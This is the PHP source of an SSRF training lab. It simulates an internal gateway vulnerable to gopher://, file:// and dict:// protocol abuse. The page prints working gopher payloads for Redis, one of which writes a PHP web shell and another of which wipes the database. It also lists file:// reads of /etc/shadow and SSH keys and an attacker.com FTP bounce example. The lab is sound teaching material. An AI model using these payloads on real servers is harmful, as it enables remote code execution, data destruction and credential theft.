<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['SSRF']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['ssrf_hard3_attempts'])) {
$_SESSION['ssrf_hard3_attempts'] = 0;
}
if (!isset($_SESSION['ssrf_hard3_solved'])) {
$_SESSION['ssrf_hard3_solved'] = false;
}
if (!isset($_SESSION['ssrf_hard3_stage'])) {
$_SESSION['ssrf_hard3_stage'] = 1;
}

// ─── Simulated Internal Services ───────────────────────────────────────
$internal_services = [
'redis'      => ['name' => 'Redis Server',      'host' => 'redis.darkhunter.local',      'port' => 6379,  'protocol' => 'redis'],
'memcached'  => ['name' => 'Memcached Cache',   'host' => 'memcached.darkhunter.local',  'port' => 11211, 'protocol' => 'memcached'],
'mysql'      => ['name' => 'MySQL Database',    'host' => 'mysql.darkhunter.local',      'port' => 3306,  'protocol' => 'mysql'],
'elasticsearch' => ['name' => 'ElasticSearch',  'host' => 'es.darkhunter.local',         'port' => 9200,  'protocol' => 'http'],
];

// ─── Vulnerable Logic: URL parameter with protocol support ───────────────
$url = isset($_GET['url']) ? $_GET['url'] : 'http://api.darkhunter.local:8080/health';

$exploited = false;
$response = '';
$service_type = '';
$command_executed = '';

// Parse URL to detect protocol abuse
$parsed = parse_url($url);
$scheme = isset($parsed['scheme']) ? strtolower($parsed['scheme']) : 'http';

// Check for dangerous protocols
$dangerous_schemes = ['gopher', 'file', 'dict', 'ftp', 'ldap', 'tftp'];
$is_dangerous = in_array($scheme, $dangerous_schemes);

// Check for Redis/Memcached via Gopher
if ($is_dangerous && $scheme === 'gopher') {
$host = isset($parsed['host']) ? $parsed['host'] : '';
$port = isset($parsed['port']) ? $parsed['port'] : 70;
$path = isset($parsed['path']) ? $parsed['path'] : '';

// Check if targeting Redis or Memcached
if ($port == 6379 || stripos($host, 'redis') !== false) {
$service_type = 'redis';
$exploited = true;

// Decode gopher payload
$payload = urldecode(substr($path, 1)); // Remove leading /

// Check for specific Redis commands
if (
  stripos($payload, 'CONFIG SET dir') !== false ||
  stripos($payload, 'CONFIG SET dbfilename') !== false ||
  stripos($payload, 'SET') !== false && stripos($payload, 'cron') !== false
) {
  $command_executed = 'Redis RCE Payload - Writing web shell via CONFIG SET';
} elseif (stripos($payload, 'FLUSHALL') !== false) {
  $command_executed = 'Redis FLUSHALL - Database wiped';
} elseif (stripos($payload, 'INFO') !== false) {
  $command_executed = 'Redis INFO - Server information leaked';
} else {
  $command_executed = 'Redis Command Injection - Raw protocol command executed';
}

$response = "+OK\r\n";
if (stripos($payload, 'INFO') !== false) {
  $response = "\$3727\r\nredis_version:7.0.12\r\nredis_mode:standalone\r\nos:Linux 5.15.0\r\narch_bits:64\r\nprocess_id:1234\r\nuptime_in_seconds:86400\r\nconnected_clients:5\r\nused_memory_human:512.45M\r\nrole:master\r\n";
}
} elseif ($port == 11211 || stripos($host, 'memcached') !== false) {
$service_type = 'memcached';
$exploited = true;
$command_executed = 'Memcached Command Injection - Raw binary protocol';
$response = "STORED\r\n";
}
}

// Check for file:// protocol abuse
if ($scheme === 'file') {
$exploited = true;
$service_type = 'file';
$path = isset($parsed['path']) ? $parsed['path'] : '';

$sensitive_files = [
'/etc/passwd',
'/etc/shadow',
'/etc/hosts',
'/proc/self/environ',
'/var/www/html/config.php',
'/root/.ssh/id_rsa',
'/etc/crontab',
'C:\\Windows\\System32\\drivers\\etc\\hosts',
'C:\\inetpub\\wwwroot\\web.config'
];

foreach ($sensitive_files as $sf) {
if (stripos($path, $sf) !== false || stripos($path, basename($sf)) !== false) {
  $command_executed = "LFI via file:// - Reading $sf";
  if (strpos($sf, 'passwd') !== false) {
    $response = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n";
  } elseif (strpos($sf, 'hosts') !== false) {
    $response = "127.0.0.1 localhost\n127.0.1.1 darkhunter-server\n192.168.1.10 redis.darkhunter.local\n192.168.1.11 memcached.darkhunter.local\n";
  } else {
    $response = "[FILE CONTENTS - SENSITIVE DATA EXFILTRATED]\n";
  }
  break;
}
}
if (empty($command_executed)) {
$command_executed = "LFI via file:// - Attempted file read: $path";
$response = "[ERROR] File not found or access denied\n";
}
}

// Check for dict:// protocol abuse
if ($scheme === 'dict') {
$exploited = true;
$service_type = 'dict';
$command_executed = 'Dict Protocol Injection - Port scanning or service interaction';
$response = "220 dict.darkhunter.local dictd 1.12.1 <auth.mime> <client.111>\r\n250 ok\r\n";
}

// Normal HTTP response
if (!$exploited) {
$response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\": \"ok\", \"service\": \"internal-api\", \"timestamp\": " . time() . "}";
}

$current_stage = $_SESSION['ssrf_hard3_stage'];
$stage_messages = [
1 => "Stage 1: Map internal services and identify supported protocols.",
2 => "Stage 2: Abuse alternative protocols (gopher://, file://, dict://) to reach internal services.",
3 => "Stage 3: Craft raw protocol payloads to execute commands on Redis/Memcached for RCE or data theft.",
];

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['ssrf_hard3_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
$_SESSION['ssrf_hard3_attempts']++;
if (!$already_solved && isset($_SESSION['user_id'])) solveLab($pdo, $lab['id']);
$_SESSION['ssrf_hard3_solved'] = true;
$already_solved = true;
$success_msg = "Outstanding! You've exploited SSRF through protocol abuse. By using the gopher:// protocol, you sent raw Redis commands directly to the internal Redis server, bypassing HTTP-based restrictions. This demonstrates how alternative protocols can be weaponized for RCE, data exfiltration, and complete infrastructure compromise!";
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['url'])) $_SESSION['ssrf_hard3_attempts']++;
$attempts = $_SESSION['ssrf_hard3_attempts'];

if ($attempts >= 3 && $current_stage < 2) {
$_SESSION['ssrf_hard3_stage'] = 2;
$current_stage = 2;
}
if ($attempts >= 6 && $current_stage < 3) {
$_SESSION['ssrf_hard3_stage'] = 3;
$current_stage = 3;
}

// Generate gopher payloads
$gopher_payloads = [
'Redis INFO' => 'gopher://127.0.0.1:6379/_INFO%0d%0a',
'Redis FLUSHALL' => 'gopher://127.0.0.1:6379/_FLUSHALL%0d%0a',
'Redis RCE (Web Shell)' => 'gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system(%24_GET%5Bcmd%5D)%3B%3F%3E%22%0d%0aSAVE%0d%0a',
'Memcached Set' => 'gopher://127.0.0.1:11211/_set%20hack%200%20900%205%0d%0ahello%0d%0a',
];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Protocol Smuggler - SSRF Hard 3</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/SSRF-CASE7.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>
  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to SSRF Labs</a>
    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-database"></i> DarkHunter Protocol Smuggler</h1>
      <p class="lab-description">An internal service gateway that forwards requests using various protocols.
        <strong>Can you abuse gopher://, file://, or dict://</strong> to reach Redis, Memcached, or local files?
      </p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner"><i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this protocol abuse vulnerability.</p>
      </div>
    </div>
    <?php endif; ?>
    <?php if ($success_msg): ?>
    <div class="success-alert"><i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <div class="stage-tracker">
      <div class="stage-header"><i class="fas fa-layer-group"></i><span>Attack Chain Progress</span></div>
      <div class="stages">
        <div
          class="stage <?php echo $current_stage >= 1 ? 'active' : ''; ?> <?php echo $current_stage > 1 ? 'completed' : ''; ?>">
          <div class="stage-number">1</div>
          <div class="stage-info"><span class="stage-title">Reconnaissance</span><span class="stage-desc">Map protocols
              & services</span></div>
        </div>
        <div class="stage-connector"></div>
        <div
          class="stage <?php echo $current_stage >= 2 ? 'active' : ''; ?> <?php echo $current_stage > 2 ? 'completed' : ''; ?>">
          <div class="stage-number">2</div>
          <div class="stage-info"><span class="stage-title">Protocol Abuse</span><span class="stage-desc">Bypass HTTP
              filters</span></div>
        </div>
        <div class="stage-connector"></div>
        <div class="stage <?php echo $current_stage >= 3 ? 'active' : ''; ?>">
          <div class="stage-number">3</div>
          <div class="stage-info"><span class="stage-title">RCE / Data Theft</span><span class="stage-desc">Execute
              Redis commands</span></div>
        </div>
      </div>
      <div class="stage-message"><i
          class="fas fa-info-circle"></i><span><?php echo $stage_messages[$current_stage]; ?></span></div>
    </div>

    <div class="gateway-card">
      <div class="gateway-header">
        <div class="gateway-brand"><i class="fas fa-network-wired"></i><span>Protocol Gateway</span></div>
        <div class="gateway-badge"><i class="fas fa-exchange-alt"></i><span>Multi-Protocol Router</span></div>
      </div>
      <div class="gateway-body">
        <div class="request-panel">
          <div class="request-header"><i class="fas fa-paper-plane"></i><span>Outgoing Request</span></div>
          <div class="url-bar">
            <span class="url-method">GET</span>
            <code class="url-display"><?php echo htmlspecialchars($url); ?></code>
          </div>
          <div class="protocol-indicator <?php echo $is_dangerous ? 'danger' : 'safe'; ?>">
            <i class="fas fa-<?php echo $is_dangerous ? 'exclamation-triangle' : 'check-circle'; ?>"></i>
            <span>Protocol: <?php echo strtoupper($scheme); ?>
              <?php echo $is_dangerous ? '(DANGEROUS - UNSANITIZED!)' : '(Allowed)'; ?></span>
          </div>
        </div>

        <div class="services-panel">
          <div class="services-header"><i class="fas fa-server"></i><span>Internal Services Map</span></div>
          <div class="services-grid">
            <?php foreach ($internal_services as $key => $svc): ?>
            <div class="service-card <?php echo $service_type === $key ? 'targeted' : ''; ?>">
              <div class="service-icon"><i
                  class="fas fa-<?php echo $key === 'redis' ? 'database' : ($key === 'memcached' ? 'memory' : ($key === 'mysql' ? 'table' : 'search')); ?>"></i>
              </div>
              <div class="service-info">
                <span class="service-name"><?php echo $svc['name']; ?></span>
                <code class="service-addr"><?php echo $svc['host']; ?>:<?php echo $svc['port']; ?></code>
                <span class="service-protocol"><?php echo $svc['protocol']; ?></span>
              </div>
              <?php if ($service_type === $key): ?>
              <div class="service-hit"><i class="fas fa-crosshairs"></i> TARGETED</div>
              <?php endif; ?>
            </div>
            <?php endforeach; ?>
          </div>
        </div>

        <div class="response-panel">
          <div class="response-header">
            <i class="fas fa-reply"></i><span>Backend Response</span>
            <span class="response-badge <?php echo $exploited ? 'exploit' : 'success'; ?>">
              <i class="fas fa-<?php echo $exploited ? 'bug' : 'check'; ?>"></i>
              <?php echo $exploited ? 'PROTOCOL ABUSED' : '200 OK'; ?>
            </span>
          </div>
          <div class="response-body">
            <?php if ($command_executed): ?>
            <div class="command-alert">
              <i class="fas fa-terminal"></i>
              <span><strong>Command Detected:</strong> <?php echo htmlspecialchars($command_executed); ?></span>
            </div>
            <?php endif; ?>
            <pre class="response-content"><?php echo htmlspecialchars($response); ?></pre>
          </div>
        </div>
      </div>
    </div>

    <div class="payloads-panel">
      <div class="payloads-header"><i class="fas fa-code"></i><span>Gopher Payload Arsenal</span></div>
      <div class="payloads-body">
        <div class="payload-intro">
          <p>Gopher protocol allows sending <strong>raw TCP payloads</strong> to any internal service.
            Since many SSRF filters only block http:// and https://, gopher:// slips through and delivers arbitrary
            bytes.</p>
        </div>
        <?php foreach ($gopher_payloads as $name => $payload): ?>
        <div class="payload-row">
          <div class="payload-info">
            <span class="payload-name"><?php echo $name; ?></span>
            <code class="payload-code"><?php echo htmlspecialchars($payload); ?></code>
          </div>
          <a href="?url=<?php echo urlencode($payload); ?>" class="payload-launch">
            <i class="fas fa-rocket"></i> Launch
          </a>
        </div>
        <?php endforeach; ?>
      </div>
    </div>

    <div class="protocols-panel">
      <div class="protocols-header"><i class="fas fa-shield-alt"></i><span>Protocol Abuse Reference</span></div>
      <div class="protocols-body">
        <div class="protocol-row">
          <span class="protocol-name"><i class="fas fa-file"></i> file://</span>
          <span class="protocol-desc">Read local files - /etc/passwd, web configs, SSH keys</span>
          <code class="protocol-example">file:///etc/passwd</code>
        </div>
        <div class="protocol-row">
          <span class="protocol-name"><i class="fas fa-network-wired"></i> gopher://</span>
          <span class="protocol-desc">Raw TCP to Redis, Memcached, SMTP, MySQL</span>
          <code class="protocol-example">gopher://127.0.0.1:6379/_INFO%0d%0a</code>
        </div>
        <div class="protocol-row">
          <span class="protocol-name"><i class="fas fa-book"></i> dict://</span>
          <span class="protocol-desc">Dictionary protocol for port scanning and service interaction</span>
          <code class="protocol-example">dict://127.0.0.1:11211/</code>
        </div>
        <div class="protocol-row">
          <span class="protocol-name"><i class="fas fa-upload"></i> ftp://</span>
          <span class="protocol-desc">FTP protocol for SSRF via PASV mode bounce attacks</span>
          <code class="protocol-example">ftp://attacker.com:6379/</code>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body"><code>GET /SSRF-CASE7.php?url=<?php echo urlencode($url); ?></code></div>
    </div>
    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-bug"></i><span>Vulnerable Code Snippet</span></div>
      <div class="debug-body">
        <div class="code-block">
          <pre>// VULNERABLE: No protocol whitelist
$url = $_GET['url'];

// cURL follows ANY protocol the server supports!
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_ALL); // DANGEROUS!
curl_exec($ch);

// Attacker sends: gopher://127.0.0.1:6379/_FLUSHALL%0d%0a
// Result: Redis database wiped!

// Or: file:///var/www/html/config.php
// Result: Local file contents exposed!</pre>
        </div>
        <div class="vuln-note critical"><i class="fas fa-radiation"></i><span><strong>Critical:</strong> Protocol abuse
            allows attackers to bypass HTTP-only SSRF filters. Gopher sends raw bytes to any TCP service, enabling
            direct interaction with Redis, Memcached, and other internal infrastructure without HTTP overhead.</span>
        </div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">The URL parameter accepts ANY protocol cURL supports. Try <code>file:///etc/passwd</code>
        or <code>gopher://127.0.0.1:6379/_INFO%0d%0a</code> to test protocol support.</div>
    </div>
    <?php endif; ?>
    <?php if ($attempts >= 5): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">Redis uses a simple text protocol. Via gopher:// you can send raw commands:
        <code>gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a</code> to prepare for web shell
        injection.
      </div>
    </div>
    <?php endif; ?>
    <?php if ($attempts >= 8): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Use any gopher:// payload targeting port 6379 (Redis) or any file:// payload reading
        sensitive files to trigger the exploit detection and earn the flag!</div>
    </div>
    <?php endif; ?>

    <div class="attempts-bar"><i class="fas fa-crosshairs"></i><span>Attempts:
        <strong><?php echo $attempts; ?></strong></span></div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
    <input type="hidden" name="url" value="<?php echo htmlspecialchars($url); ?>">
  </form>

  <script>
  window.addEventListener('load', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const url = urlParams.get('url') || '';
    const dangerous = ['gopher://', 'file://', 'dict://', 'ftp://', 'ldap://', 'tftp://'];
    const isExploit = dangerous.some(p => url.toLowerCase().startsWith(p));
    if (isExploit && !document.querySelector('.solved-banner')) {
      document.getElementById('solved-flag').value = '1';
      document.getElementById('success-form').submit();
    }
  });
  </script>
</body>

</html>